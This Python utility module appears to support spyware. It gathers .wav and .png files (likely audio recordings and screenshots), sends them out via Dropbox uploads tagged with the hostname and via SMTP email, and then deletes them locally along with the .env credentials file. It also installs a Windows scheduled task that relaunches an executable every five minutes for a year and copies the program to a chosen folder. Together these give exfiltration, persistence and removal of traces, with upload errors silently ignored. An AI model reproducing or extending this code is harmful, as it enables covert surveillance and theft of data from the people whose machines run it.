import os
import shutil
import smtplib
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def send_mail_with_attachment(
    smtp_server,
    smtp_port,
    email_address,
    email_password,
    email_sender,
    email_receiver,
    cc="",
    path_to_attachment="",
    attachments=[],
    subject="",
    body="",
):
    message = MIMEMultipart()
    message["From"] = email_sender
    message["To"] = email_receiver
    message["Cc"] = cc
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    for attachment in attachments:  # [filename_1, filename_2]
        # Open the file as binary mode
        attach_file = open("{0}/{1}".format(path_to_attachment, attachment), "rb")
        payload = MIMEBase("application", "octate-stream")
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)  # encode the attachment

        # Add payload header with filename
        payload.add_header("Content-Disposition", f"attachment; filename={attachment}")
        message.attach(payload)

    session = smtplib.SMTP(smtp_server, smtp_port)
    # session.starttls()  # Enable security
    session.login(email_address, email_password)
    text = message.as_string()
    session.sendmail(email_sender, email_receiver, text)
    session.quit()

    return True


def get_wav_and_png_files(dest_folder):
    wav_and_png_files = []
    for filename in os.listdir(dest_folder):
        if filename.endswith(".wav") or filename.endswith(".png"):
            wav_and_png_files.append(filename)

    return wav_and_png_files


def delete_wav_and_png_files(dest_folder):
    for filename in os.listdir(dest_folder):
        if filename.endswith(".wav") or filename.endswith(".png"):
            file_path = os.path.join(dest_folder, filename)
            os.remove(file_path)


def remove_env_file():
    if os.name == "nt":  # Windows
        env_file = os.path.join(os.getcwd(), ".env")
        if os.path.exists(env_file):
            os.remove(env_file)
    else:  # Linux or Unix
        env_file = os.path.join(os.getcwd(), ".env")
        if os.path.exists(env_file):
            os.remove(env_file)


def upload_to_dropbox(hostname, dbx, wav_and_png_files):
    for file_name in wav_and_png_files:
        file_path = os.path.join(os.getcwd(), file_name)
        destination_path = f"/{hostname}_{file_name}"

        try:
            with open(file_path, "rb") as f:
                dbx.files_upload(f.read(), destination_path)
        except (dbx.exceptions.ApiError, FileNotFoundError, Exception):
            return


def create_scheduled_task(executable_path, task_name):
    check_task_command = f'if (Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue) {{ exit 1 }} else {{ exit 0 }}'
    task_exists = subprocess.run(
        ["powershell", "-Command", check_task_command], capture_output=True, text=True
    )

    if task_exists.returncode == 1:
        return
    else:
        create_task_command = f"""
        $action = New-ScheduledTaskAction -Execute '{executable_path}'
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "{task_name}" -Description "Esegue il processo custom ogni 5 minuti"
        """
        subprocess.run(["powershell", "-Command", create_task_command], check=True)

        check_process_command = f"""
        if (-not (Get-Process -Name 'main' -ErrorAction SilentlyContinue)) {{
            Start-Process '{executable_path}'
        }}
        """
        subprocess.run(["powershell", "-Command", check_process_command], check=True)


def save_program_in_location(src_file, dest_folder):
    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)

    dest_file = os.path.join(dest_folder, os.path.basename(src_file))
    shutil.copy(src_file, dest_file)

    return dest_file
